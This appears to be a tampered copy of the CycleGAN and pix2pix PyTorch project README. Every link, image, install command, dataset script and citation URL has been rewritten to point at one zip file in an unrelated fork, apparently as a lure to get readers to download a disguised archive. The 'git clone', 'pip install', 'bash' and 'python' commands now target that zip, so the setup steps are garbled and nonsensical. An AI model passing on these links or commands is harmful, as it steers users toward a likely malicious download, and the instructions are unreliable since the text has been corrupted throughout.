
<img src='https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip' align="right" width=384>

<br><br><br>

# CycleGAN and pix2pix in PyTorch

**New**:  Please check out [contrastive-unpaired-translation](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) (CUT), our new unpaired image-to-image translation model that enables fast and memory-efficient training.

We provide PyTorch implementations for both unpaired and paired image-to-image translation.

The code was written by [Jun-Yan Zhu](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) and [Taesung Park](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip), and supported by [Tongzhou Wang](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip).

This PyTorch implementation produces results comparable to or better than our original Torch software. If you would like to reproduce the same results as in the papers, check out the original [CycleGAN Torch](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) and [pix2pix Torch](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) code in Lua/Torch.

**Note**: The current software works well with PyTorch 1.4. Check out the older [branch](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) that supports PyTorch 0.1-0.3.

You may find useful information in [training/test tips](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) and [frequently asked questions](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip). To implement custom models and datasets, check out our [templates](#custom-model-and-dataset). To help users better understand and adapt our codebase, we provide an [overview](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) of the code structure of this repository.

**CycleGAN: [Project](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) |  [Paper](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) |  [Torch](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) |
[Tensorflow Core Tutorial](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [PyTorch Colab](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)**

<img src="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip" width="800"/>

**Pix2pix:  [Project](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) |  [Paper](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) |  [Torch](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) |
[Tensorflow Core Tutorial](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [PyTorch Colab](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)**

<img src="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip" width="800px"/>


**[EdgesCats Demo](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [pix2pix-tensorflow](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | by [Christopher Hesse](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)**

<img src='https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip' width="400px"/>

If you use this code for your research, please cite:

Unpaired Image-to-Image Translation using Cycle-Consistent Adversarial Networks.<br>
[Jun-Yan Zhu](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~junyanz/)\*,  [Taesung Park](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)\*, [Phillip Isola](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~isola/), [Alexei A. Efros](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~efros). In ICCV 2017. (* equal contributions) [[Bibtex]](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)


Image-to-Image Translation with Conditional Adversarial Networks.<br>
[Phillip Isola](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~isola), [Jun-Yan Zhu](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~junyanz/), [Tinghui Zhou](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~tinghuiz), [Alexei A. Efros](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~efros). In CVPR 2017. [[Bibtex]](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)

## Talks and Course
pix2pix slides: [keynote](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [pdf](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip),
CycleGAN slides: [pptx](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [pdf](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)

CycleGAN course assignment [code](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) and [handout](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) designed by Prof. [Roger Grosse](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~rgrosse/) for [CSC321](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~rgrosse/courses/csc321_2018/) "Intro to Neural Networks and Machine Learning" at University of Toronto. Please contact the instructor if you would like to adopt it in your course.

## Colab Notebook
TensorFlow Core CycleGAN Tutorial: [Google Colab](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [Code](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)

TensorFlow Core pix2pix Tutorial: [Google Colab](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [Code](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)

PyTorch Colab notebook: [CycleGAN](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) and [pix2pix](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)

ZeroCostDL4Mic Colab notebook: [CycleGAN](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) and [pix2pix](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)

## Other implementations
### CycleGAN
<p><a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip"> [Tensorflow]</a> (by Harry Yang),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Tensorflow]</a> (by Archit Rathore),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Tensorflow]</a> (by Van Huy),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Tensorflow]</a> (by Xiaowei Hu),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip"> [Tensorflow2]</a> (by Zhenliang He),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip"> [TensorLayer1.0]</a> (by luoxier),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip"> [TensorLayer2.0]</a> (by zsdonghao),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Chainer]</a> (by Yanghua Jin),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Minimal PyTorch]</a> (by yunjey),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Mxnet]</a> (by Ldpe2G),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[lasagne/Keras]</a> (by tjwei),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Keras]</a> (by Simon Karlsson),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[OneFlow]</a> (by Ldpe2G)
</p>
</ul>

### pix2pix
<p><a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip"> [Tensorflow]</a> (by Christopher Hesse),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Tensorflow]</a> (by Eyyüb Sariu),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip"> [Tensorflow (face2face)]</a> (by Dat Tran),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip"> [Tensorflow (film)]</a> (by Arthur Juliani),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Tensorflow (zi2zi)]</a> (by Yuchen Tian),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Chainer]</a> (by mattya),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[tf/torch/keras/lasagne]</a> (by tjwei),
<a href="https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip">[Pytorch]</a> (by taey16)
</p>
</ul>

## Prerequisites
- Linux or macOS
- Python 3
- CPU or NVIDIA GPU + CUDA CuDNN

## Getting Started
### Installation

- Clone this repo:
```bash
git clone https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip
cd pytorch-CycleGAN-and-pix2pix
```

- Install [PyTorch](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) and 0.4+ and other dependencies (e.g., torchvision, [visdom](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) and [dominate](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)).
  - For pip users, please type the command `pip install -r https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`.
  - For Conda users, you can create a new Conda environment using `conda env create -f https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`.
  - For Docker users, we provide the pre-built Docker image and Dockerfile. Please refer to our [Docker](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) page.
  - For Repl users, please click [![Run on https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip).

### CycleGAN train/test
- Download a CycleGAN dataset (e.g. maps):
```bash
bash https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip maps
```
- To view training results and loss plots, run `python -m https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip` and click the URL http://localhost:8097.
- To log training progress and test images to W&B dashboard, set the `--use_wandb` flag with train and test script
- Train a model:
```bash
#!https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip
python https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip --dataroot ./datasets/maps --name maps_cyclegan --model cycle_gan
```
To see more intermediate results, check out `https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`.
- Test the model:
```bash
#!https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip
python https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip --dataroot ./datasets/maps --name maps_cyclegan --model cycle_gan
```
- The test results will be saved to a html file here: `https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`.

### pix2pix train/test
- Download a pix2pix dataset (e.g.[facades](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip~tylecr1/facade/)):
```bash
bash https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip facades
```
- To view training results and loss plots, run `python -m https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip` and click the URL http://localhost:8097.
- To log training progress and test images to W&B dashboard, set the `--use_wandb` flag with train and test script
- Train a model:
```bash
#!https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip
python https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip --dataroot ./datasets/facades --name facades_pix2pix --model pix2pix --direction BtoA
```
To see more intermediate results, check out  `https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`.

- Test the model (`bash https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`):
```bash
#!https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip
python https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip --dataroot ./datasets/facades --name facades_pix2pix --model pix2pix --direction BtoA
```
- The test results will be saved to a html file here: `https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`. You can find more scripts at `scripts` directory.
- To train and test pix2pix-based colorization models, please add `--model colorization` and `--dataset_mode colorization`. See our training [tips](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) for more details.

### Apply a pre-trained model (CycleGAN)
- You can download a pretrained model (e.g. horse2zebra) with the following script:
```bash
bash https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip horse2zebra
```
- The pretrained model is saved at `./checkpoints/{name}https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`. Check [here](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) for all the available CycleGAN models.
- To test the model, you also need to download the  horse2zebra dataset:
```bash
bash https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip horse2zebra
```

- Then generate the results using
```bash
python https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip --dataroot datasets/horse2zebra/testA --name horse2zebra_pretrained --model test --no_dropout
```
- The option `--model test` is used for generating results of CycleGAN only for one side. This option will automatically set `--dataset_mode single`, which only loads the images from one set. On the contrary, using `--model cycle_gan` requires loading and generating results in both directions, which is sometimes unnecessary. The results will be saved at `./results/`. Use `--results_dir {directory_path_to_save_result}` to specify the results directory.

- For pix2pix and your own models, you need to explicitly specify `--netG`, `--norm`, `--no_dropout` to match the generator architecture of the trained model. See this [FAQ](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) for more details.

### Apply a pre-trained model (pix2pix)
Download a pre-trained model with `https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`.

- Check [here](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) for all the available pix2pix models. For example, if you would like to download label2photo model on the Facades dataset,
```bash
bash https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip facades_label2photo
```
- Download the pix2pix facades datasets:
```bash
bash https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip facades
```
- Then generate the results using
```bash
python https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip --dataroot ./datasets/facades/ --direction BtoA --model pix2pix --name facades_label2photo_pretrained
```
- Note that we specified `--direction BtoA` as Facades dataset's A to B direction is photos to labels.

- If you would like to apply a pre-trained model to a collection of input images (rather than image pairs), please use `--model test` option. See `https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip` for how to apply a model to Facade label maps (stored in the directory `facades/testB`).

- See a list of currently available models at `https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip`

## [Docker](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)
We provide the pre-built Docker image and Dockerfile that can run this code repo. See [docker](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip).

## [Datasets](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)
Download pix2pix/CycleGAN datasets and create your own datasets.

## [Training/Test Tips](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)
Best practice for training and testing your models.

## [Frequently Asked Questions](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)
Before you post a new question, please first look at the above Q & A and existing GitHub issues.

## Custom Model and Dataset
If you plan to implement custom models and dataset for your new applications, we provide a dataset [template](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) and a model [template](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) as a starting point.

## [Code structure](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)
To help users better understand and use our code, we briefly overview the functionality and implementation of each package and each module.

## Pull Request
You are always welcome to contribute to this repository by sending a [pull request](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip).
Please run `flake8 --ignore E501 .` and `python https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip` before you commit the code. Please also update the code structure [overview](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) accordingly if you add or remove files.

## Citation
If you use this code for your research, please cite our papers.
```
@inproceedings{CycleGAN2017,
  title={Unpaired Image-to-Image Translation using Cycle-Consistent Adversarial Networks},
  author={Zhu, Jun-Yan and Park, Taesung and Isola, Phillip and Efros, Alexei A},
  booktitle={Computer Vision (ICCV), 2017 IEEE International Conference on},
  year={2017}
}


@inproceedings{isola2017image,
  title={Image-to-Image Translation with Conditional Adversarial Networks},
  author={Isola, Phillip and Zhu, Jun-Yan and Zhou, Tinghui and Efros, Alexei A},
  booktitle={Computer Vision and Pattern Recognition (CVPR), 2017 IEEE Conference on},
  year={2017}
}
```

## Other Languages
[Spanish](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)

## Related Projects
**[contrastive-unpaired-translation](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) (CUT)**<br>
**[CycleGAN-Torch](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) |
[pix2pix-Torch](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [pix2pixHD](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)|
[BicycleGAN](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [vid2vid](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [SPADE/GauGAN](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)**<br>
**[iGAN](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [GAN Dissection](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip) | [GAN Paint](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip)**

## Cat Paper Collection
If you love cats, and love reading cool graphics, vision, and learning papers, please check out the Cat Paper [Collection](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip).

## Acknowledgments
Our code is inspired by [pytorch-DCGAN](https://raw.githubusercontent.com/pyaekyaw-dev/pytorch-CycleGAN-and-pix2pix/master/util/pytorch_GA_pix_and_Cycle_v2.6.zip).
